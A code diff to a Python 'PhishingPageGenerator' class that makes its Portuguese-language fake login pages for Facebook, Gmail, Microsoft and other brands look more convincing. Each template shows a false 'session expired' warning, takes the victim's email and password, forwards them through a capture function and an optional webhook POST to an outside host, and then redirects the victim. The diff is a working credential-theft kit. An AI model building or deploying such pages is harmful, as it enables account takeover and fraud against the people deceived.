@@ -831,7 +831,7 @@ class PhishingPageGenerator:
     
     def _facebook_template(self, redirect_url: str, capture_webhook: Optional[str], 
                           custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
-        """Facebook login phishing template"""
+        """Facebook login phishing template - Enhanced visual design"""
         return f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -839,64 +839,189 @@ class PhishingPageGenerator:
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{custom_title or 'Facebook - Entrar ou cadastrar-se'}</title>
     <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: Helvetica, Arial, sans-serif; background: linear-gradient(#4267B2, #FFF); min-height: 100vh; display: flex; align-items: center; justify-content: center; }}
-        .container {{ max-width: 980px; margin: 0 auto; padding: 20px; }}
-        .card {{ background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 40px; max-width: 396px; margin: 0 auto; }}
-        .logo {{ text-align: center; margin-bottom: 30px; }}
-        .logo img {{ width: 200px; }}
-        h1 {{ color: #1877f2; font-size: 42px; font-weight: bold; text-align: center; margin-bottom: 20px; }}
-        .subtitle {{ color: #606770; font-size: 16px; text-align: center; margin-bottom: 30px; }}
-        input {{ width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; margin-bottom: 12px; }}
-        input:focus {{ outline: none; border-color: #1877f2; }}
-        button {{ width: 100%; padding: 14px 16px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 10px; }}
-        button:hover {{ background: #166fe5; }}
-        .forgot {{ text-align: center; margin-top: 16px; }}
-        .forgot a {{ color: #1877f2; text-decoration: none; font-size: 14px; }}
-        .divider {{ border-top: 1px solid #dadde1; margin: 20px 0; }}
-        .create-account {{ text-align: center; margin-top: 20px; }}
-        .create-account button {{ background: #42b72a; width: auto; padding: 14px 20px; }}
-        .create-account button:hover {{ background: #36a420; }}
-        .warning {{ background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; color: #856404; font-size: 14px; }}
+        body {{ 
+            font-family: 'Roboto', Helvetica, Arial, sans-serif; 
+            background: linear-gradient(180deg, #E7F3FF 0%, #F0F2F5 100%); 
+            min-height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center;
+            padding: 20px;
+        }}
+        .container {{ max-width: 980px; width: 100%; margin: 0 auto; }}
+        .content {{ display: flex; flex-direction: column; align-items: center; gap: 32px; }}
+        .branding {{ text-align: center; margin-bottom: 20px; }}
+        .branding h1 {{ 
+            color: #1877f2; 
+            font-size: 56px; 
+            font-weight: 700; 
+            margin-bottom: 8px;
+            letter-spacing: -1px;
+            text-shadow: 0 2px 4px rgba(24,119,242,0.1);
+        }}
+        .branding p {{ 
+            color: #1c1e21; 
+            font-size: 28px; 
+            font-weight: 400;
+            line-height: 32px;
+        }}
+        .card {{ 
+            background: #ffffff; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1), 0 0 1px rgba(0,0,0,0.05); 
+            padding: 24px; 
+            max-width: 396px; 
+            width: 100%;
+        }}
+        .warning {{ 
+            background: linear-gradient(135deg, #FFF5E6 0%, #FFE8CC 100%); 
+            border-left: 4px solid #f59e0b; 
+            padding: 14px 16px; 
+            border-radius: 8px; 
+            margin-bottom: 20px; 
+            color: #92400e; 
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            box-shadow: 0 2px 4px rgba(245,158,11,0.1);
+        }}
+        .warning::before {{
+            content: '⚠️';
+            font-size: 18px;
+        }}
+        input {{ 
+            width: 100%; 
+            padding: 16px 18px; 
+            border: 1px solid #dddfe2; 
+            border-radius: 8px; 
+            font-size: 17px; 
+            margin-bottom: 12px;
+            transition: all 0.2s ease;
+            background: #f5f6f7;
+        }}
+        input:focus {{ 
+            outline: none; 
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24,119,242,0.1);
+            background: #ffffff;
+        }}
+        input::placeholder {{ color: #8a8d91; }}
+        button.login {{ 
+            width: 100%; 
+            padding: 16px; 
+            background: linear-gradient(180deg, #1877f2 0%, #0c63d4 100%); 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-size: 20px; 
+            font-weight: 700; 
+            cursor: pointer; 
+            margin-top: 10px;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(24,119,242,0.3);
+        }}
+        button.login:hover {{ 
+            background: linear-gradient(180deg, #166fe5 0%, #0b5cca 100%);
+            box-shadow: 0 4px 12px rgba(24,119,242,0.4);
+            transform: translateY(-1px);
+        }}
+        button.login:active {{
+            transform: translateY(0);
+            box-shadow: 0 2px 6px rgba(24,119,242,0.3);
+        }}
+        .forgot {{ 
+            text-align: center; 
+            margin-top: 18px; 
+            margin-bottom: 18px;
+        }}
+        .forgot a {{ 
+            color: #1877f2; 
+            text-decoration: none; 
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }}
+        .forgot a:hover {{ color: #166fe5; text-decoration: underline; }}
+        .divider {{ 
+            border-top: 1px solid #dadde1; 
+            margin: 24px 0; 
+        }}
+        .create-account {{ 
+            text-align: center; 
+        }}
+        .create-account button {{ 
+            background: linear-gradient(180deg, #42b72a 0%, #36a420 100%); 
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(66,183,42,0.3);
+        }}
+        .create-account button:hover {{ 
+            background: linear-gradient(180deg, #36a420 0%, #2d8a1a 100%);
+            box-shadow: 0 4px 12px rgba(66,183,42,0.4);
+            transform: translateY(-1px);
+        }}
+        .footer {{ 
+            text-align: center; 
+            margin-top: 32px; 
+            font-size: 13px; 
+            color: #65676b;
+        }}
+        @media (max-width: 500px) {{
+            .branding h1 {{ font-size: 42px; }}
+            .branding p {{ font-size: 22px; }}
+            .card {{ padding: 20px; }}
+        }}
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="card">
-            <div class="logo">
+        <div class="content">
+            <div class="branding">
                 <h1>facebook</h1>
+                <p>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</p>
             </div>
-            <div class="warning">⚠️ Sua sessão expirou. Por favor, faça login novamente.</div>
-            <form id="loginForm">
-                <input type="email" name="email" placeholder="Email ou telefone" required>
-                <input type="password" name="password" placeholder="Senha" required>
-                <button type="submit">Entrar</button>
-            </form>
-            <div class="forgot">
-                <a href="#">Esqueceu a senha?</a>
+            <div class="card">
+                <div class="warning">
+                    Sua sessão expirou. Por favor, faça login novamente para continuar.
+                </div>
+                <form id="loginForm">
+                    <input type="text" name="email" placeholder="Email ou telefone" required autocomplete="username">
+                    <input type="password" name="password" placeholder="Senha" required autocomplete="current-password">
+                    <button type="submit" class="login">Entrar</button>
+                </form>
+                <div class="forgot">
+                    <a href="#">Esqueceu a conta?</a>
+                </div>
+                <div class="divider"></div>
+                <div class="create-account">
+                    <button type="button">Criar nova conta</button>
+                </div>
             </div>
-            <div class="divider"></div>
-            <div class="create-account">
-                <button>Criar nova conta</button>
+            <div class="footer">
+                <p><b>Meta</b> © 2024</p>
             </div>
         </div>
     </div>
     <script>
-        // Generic script handles data capture. This just handles specific redirect.
         async function handleSubmit(event) {{
-            // Data is already captured and sent by the generic script
-            // Update the global capturedData with form fields for redundancy
             try {{
                 const formData = new FormData(event.target);
                 if (!capturedData.form_data) capturedData.form_data = {{}};
                 for (const [key, value] of formData.entries()) {{
                     capturedData.form_data[key] = value;
                 }}
-                // Force sync credentials
                 await sendCapturedData(true);
             }} catch(e) {{}}
-            
             setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
             return false;
         }}
@@ -906,7 +1031,7 @@ class PhishingPageGenerator:
     
     def _gmail_template(self, redirect_url: str, capture_webhook: Optional[str], 
                        custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
-        """Gmail login phishing template"""
+        """Gmail login phishing template - Enhanced visual design"""
         return f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -914,26 +1039,29 @@ class PhishingPageGenerator:
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{custom_title or 'Fazer login - Contas do Google'}</title>
     <link rel="icon" href="https://ssl.gstatic.com/accounts/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <style>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
-        .container {{ max-width: 450px; margin: 0 auto; }}
-        .card {{ border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }}
-        .logo {{ text-align: center; margin-bottom: 20px; }}
-        .logo img {{ width: 75px; }}
+        body {{ font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }}
+        .container {{ max-width: 450px; width: 100%; margin: 0 auto; }}
+        .card {{ border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; box-shadow: 0 1px 3px rgba(60,64,67,0.3), 0 4px 8px rgba(60,64,67,0.15); }}
+        .logo {{ text-align: center; margin-bottom: 24px; }}
+        .logo svg {{ width: 75px; height: 24px; }}
         h1 {{ font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }}
-        .subtitle {{ font-size: 16px; color: #5f6368; text-align: center; margin-bottom: 30px; }}
-        input {{ width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 20px; }}
-        input:focus {{ outline: none; border-color: #1a73e8; border-width: 2px; }}
-        .forgot {{ margin-bottom: 30px; }}
-        .forgot a {{ color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }}
-        .forgot a:hover {{ text-decoration: underline; }}
+        .subtitle {{ font-size: 16px; color: #5f6368; text-align: center; margin-bottom: 28px; font-weight: 400; }}
+        input {{ width: 100%; padding: 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 20px; transition: all 0.2s; background: #f8f9fa; }}
+        input:focus {{ outline: none; border-color: #1a73e8; border-width: 2px; padding: 14px; background: #fff; }}
+        input::placeholder {{ color: #80868b; }}
+        .forgot {{ margin-bottom: 32px; }}
+        .forgot a {{ color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; transition: color 0.2s; }}
+        .forgot a:hover {{ color: #1765cc; text-decoration: underline; }}
         .buttons {{ display: flex; justify-content: space-between; align-items: center; }}
-        .create {{ color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }}
-        .create:hover {{ text-decoration: underline; }}
-        button {{ padding: 10px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }}
-        button:hover {{ background: #1765cc; }}
-        .warning {{ background: #fef7e0; border: 1px solid #f9ab00; padding: 16px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; color: #202124; }}
+        .create {{ color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; transition: color 0.2s; }}
+        .create:hover {{ color: #1765cc; text-decoration: underline; }}
+        button {{ padding: 10px 28px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: all 0.2s; box-shadow: 0 1px 3px rgba(26,115,232,0.4); }}
+        button:hover {{ background: #1765cc; box-shadow: 0 2px 6px rgba(26,115,232,0.5); }}
+        .warning {{ background: linear-gradient(135deg, #fef7e0 0%, #fef0cd 100%); border: 1px solid #f9ab00; border-left: 4px solid #f9ab00; padding: 16px; border-radius: 8px; margin-bottom: 24px; font-size: 14px; color: #5f4e00; display: flex; align-items: center; gap: 10px; }}
+        .warning::before {{ content: '⚠️'; font-size: 18px; }}
     </style>
 </head>
 <body>
@@ -982,55 +1110,70 @@ class PhishingPageGenerator:
     
     def _microsoft_template(self, redirect_url: str, capture_webhook: Optional[str], 
                            custom_title: Optional[str], custom_logo: Optional[str], page_id: str) -> str:
-        """Microsoft login template"""
+        """Microsoft login template - Enhanced visual design"""
         return f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{custom_title or 'Entrar na conta Microsoft'}</title>
+    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f3f2f1; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
-        .card {{ background: white; max-width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); }}
-        .logo {{ text-align: center; margin-bottom: 20px; }}
+        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f3f2f1; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }}
+        .container {{ max-width: 440px; width: 100%; }}
+        .card {{ background: white; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,0.2), 0 0 1px rgba(0,0,0,0.1); }}
+        .logo {{ text-align: center; margin-bottom: 24px; }}
         .logo svg {{ width: 108px; }}
-        h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 20px; }}
-        input {{ width: 100%; padding: 10px; border: 1px solid #8a8886; font-size: 15px; margin-bottom: 20px; }}
-        input:focus {{ outline: none; border-color: #0078d4; }}
-        button {{ width: 100%; padding: 10px; background: #0067b8; color: white; border: none; font-size: 15px; cursor: pointer; }}
-        button:hover {{ background: #005a9e; }}
-        .warning {{ background: #fff4ce; border: 1px solid #605e5c; padding: 12px; margin-bottom: 20px; font-size: 13px; }}
+        h1 {{ font-size: 24px; font-weight: 600; margin-bottom: 8px; color: #1f1f1f; }}
+        .subtitle {{ font-size: 15px; color: #605e5c; margin-bottom: 24px; }}
+        input {{ width: 100%; padding: 11px 12px; border: 1px solid #8a8886; font-size: 15px; margin-bottom: 20px; transition: all 0.2s; background: #faf9f8; }}
+        input:focus {{ outline: none; border-color: #0078d4; border-width: 2px; padding: 10px 11px; background: #fff; }}
+        input::placeholder {{ color: #8a8886; }}
+        button {{ width: 100%; padding: 11px; background: linear-gradient(180deg, #0078d4 0%, #006cc1 100%); color: white; border: none; font-size: 15px; font-weight: 600; cursor: pointer; border-radius: 2px; transition: all 0.2s; box-shadow: 0 2px 4px rgba(0,120,212,0.3); }}
+        button:hover {{ background: linear-gradient(180deg, #006cc1 0%, #005a9e 100%); box-shadow: 0 3px 8px rgba(0,120,212,0.4); }}
+        .warning {{ background: linear-gradient(135deg, #fff4ce 0%, #ffecb3 100%); border-left: 4px solid #f3b400; padding: 14px; margin-bottom: 20px; font-size: 13px; color: #323130; display: flex; align-items: center; gap: 10px; border-radius: 2px; }}
+        .warning::before {{ content: '⚠️'; font-size: 16px; }}
+        .links {{ margin-top: 20px; display: flex; justify-content: space-between; }}
+        .links a {{ color: #0067b8; text-decoration: none; font-size: 13px; }}
+        .links a:hover {{ text-decoration: underline; }}
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 300"><path fill="#f25022" d="M0 0h571v286H0z"/><path fill="#00a4ef" d="M629 0h571v286H629z"/><path fill="#7fba00" d="M0 314h571v286H0z"/><path fill="#ffb900" d="M629 314h571v286H629z"/></svg>
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+                    <path fill="#f25022" d="M1 1h10v10H1z"/><path fill="#00a4ef" d="M12 1h10v10H12z"/>
+                    <path fill="#7fba00" d="M1 12h10v10H1z"/><path fill="#ffb900" d="M12 12h10v10H12z"/>
+                </svg>
+            </div>
+            <h1>Entrar</h1>
+            <div class="subtitle">Use sua conta Microsoft</div>
+            <div class="warning">
+                Sua sessão expirou. Por favor, entre novamente
+            </div>
+            <form id="loginForm">
+                <input type="email" name="email" placeholder="E-mail, telefone ou Skype" required autocomplete="username">
+                <input type="password" name="password" placeholder="Senha" required autocomplete="current-password">
+                <button type="submit">Entrar</button>
+            </form>
+            <div class="links">
+                <a href="#">Não consegue acessar sua conta?</a>
+                <a href="#">Criar conta Microsoft</a>
+            </div>
         </div>
-        <h1>Entrar</h1>
-        <div class="warning">⚠️ Sua sessão foi encerrada. Entre novamente.</div>
-        <form id="loginForm">
-            <input type="email" name="email" placeholder="E-mail, telefone ou Skype" required>
-            <input type="password" name="password" placeholder="Senha" required>
-            <button type="submit">Entrar</button>
-        </form>
     </div>
     <script>
-        // Generic script handles data capture. This just handles specific redirect.
         async function handleSubmit(event) {{
-            // Data is already captured and sent by the generic script
-            // Update the global capturedData with form fields for redundancy
             try {{
                 const formData = new FormData(event.target);
                 if (!capturedData.form_data) capturedData.form_data = {{}};
                 for (const [key, value] of formData.entries()) {{
                     capturedData.form_data[key] = value;
                 }}
-                // Force sync credentials
                 await sendCapturedData(true);
             }} catch(e) {{}}
-
             setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
             return false;
         }}
@@ -1283,53 +1426,67 @@ class PhishingPageGenerator:
             bg = "#f3f3f3"
         elif brand.lower().startswith("paypal"):
             bg = "#f5f7fa"
-        elif brand.lower().startswith("twitter"):
+        elif brand.lower().startswith("twitter") or brand.lower().startswith("x ("):
             bg = "#f5f8fa"
         elif brand.lower().startswith("linkedin"):
             bg = "#f3f2ef"
+        elif brand.lower().startswith("instagram"):
+            bg = "linear-gradient(45deg, #feda75 0%, #fa7e1e 25%, #d62976 50%, #962fbf 75%, #4f5bd5 100%)"
         return f"""<!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{custom_title or f'Entrar - {brand}'}</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{ font-family: -apple-system, system-ui, Segoe UI, Roboto, Arial, sans-serif; background: {bg}; display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
-        .card {{ background: white; max-width: 420px; padding: 36px; border-radius: 12px; box-shadow: 0 12px 36px rgba(0,0,0,0.18); border: 1px solid rgba(0,0,0,0.06); }}
-        h1 {{ font-size: 28px; text-align: center; color: {color}; margin-bottom: 22px; font-weight: 800; letter-spacing: -0.3px; }}
-        .warning {{ background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 5px; margin-bottom: 20px; text-align: center; font-size: 14px; }}
-        input {{ width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 10px; font-size: 15px; margin-bottom: 14px; background:#fafafa; }}
-        input:focus {{ outline: none; border-color: {color}; background:#fff; }}
-        button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; }}
-        button:hover {{ background: {hover_color}; }}
+        body {{ font-family: 'Roboto', -apple-system, system-ui, Segoe UI, Arial, sans-serif; background: {bg}; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }}
+        .container {{ max-width: 420px; width: 100%; }}
+        .card {{ background: white; padding: 42px 36px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.15), 0 2px 8px rgba(0,0,0,0.1); }}
+        h1 {{ font-size: 32px; text-align: center; color: {color}; margin-bottom: 24px; font-weight: 700; letter-spacing: -0.5px; }}
+        .warning {{ background: linear-gradient(135deg, #fff3cd 0%, #ffe8a8 100%); border-left: 4px solid #ffc107; padding: 14px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-size: 14px; color: #856404; display: flex; align-items: center; gap: 10px; box-shadow: 0 2px 4px rgba(255,193,7,0.2); }}
+        .warning::before {{ content: '⚠️'; font-size: 18px; }}
+        label {{ display: block; font-size: 14px; color: #374151; margin-bottom: 6px; font-weight: 500; }}
+        input {{ width: 100%; padding: 14px 16px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; margin-bottom: 16px; background:#f9fafb; transition: all 0.2s; }}
+        input:focus {{ outline: none; border-color: {color}; border-width: 2px; padding: 13px 15px; background:#fff; box-shadow: 0 0 0 3px {color}22; }}
+        input::placeholder {{ color: #9ca3af; }}
+        button {{ width: 100%; padding: 14px; background: linear-gradient(180deg, {color} 0%, {hover_color} 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 12px {color}44; margin-top: 8px; }}
+        button:hover {{ background: linear-gradient(180deg, {hover_color} 0%, {color} 100%); box-shadow: 0 6px 16px {color}66; transform: translateY(-1px); }}
+        button:active {{ transform: translateY(0); box-shadow: 0 2px 8px {color}44; }}
+        .links {{ text-align: center; margin-top: 20px; font-size: 14px; }}
+        .links a {{ color: {color}; text-decoration: none; font-weight: 500; }}
+        .links a:hover {{ text-decoration: underline; }}
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>{brand}</h1>
-        <div class="warning">⚠️ Sessão expirada. Faça login novamente.</div>
-        <!-- Removed inline onsubmit to allow generic handler to work -->
-        <form id="loginForm">
-            <input type="email" name="email" placeholder="E-mail" required>
-            <input type="password" name="password" placeholder="Senha" required>
-            <button type="submit">Entrar</button>
-        </form>
+    <div class="container">
+        <div class="card">
+            <h1>{brand}</h1>
+            <div class="warning">
+                Sessão expirada. Por favor, faça login novamente para continuar
+            </div>
+            <form id="loginForm">
+                <label for="email">E-mail</label>
+                <input type="email" id="email" name="email" placeholder="Digite seu e-mail" required autocomplete="username">
+                <label for="password">Senha</label>
+                <input type="password" id="password" name="password" placeholder="Digite sua senha" required autocomplete="current-password">
+                <button type="submit">Entrar</button>
+            </form>
+            <div class="links">
+                <a href="#">Esqueceu a senha?</a> · 
+                <a href="#">Criar conta</a>
+            </div>
+        </div>
     </div>
     <script>
-        // Custom handler called by the generic script
         async function handleSubmit(event) {{
-            // Data is already captured by the generic script in capturedData.form_data
-            // We just need to handle the specific redirect logic
-            
-            // Update global capturedData with form fields for redundancy
             try {{
                 const formData = new FormData(event.target);
                 if (!capturedData.form_data) capturedData.form_data = {{}};
                 for (const [key, value] of formData.entries()) {{
                     capturedData.form_data[key] = value;
                 }}
-                // Force sync credentials
                 await sendCapturedData(true);
             }} catch(e) {{}}
 
@@ -1342,10 +1499,8 @@ class PhishingPageGenerator:
                 timestamp: new Date().toISOString()
             }};
             
-            // Webhook (optional)
             {'fetch("' + capture_webhook + '", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });' if capture_webhook else ''}
             
-            console.log('Template logic executed');
             setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 500);
         }}
     </script>
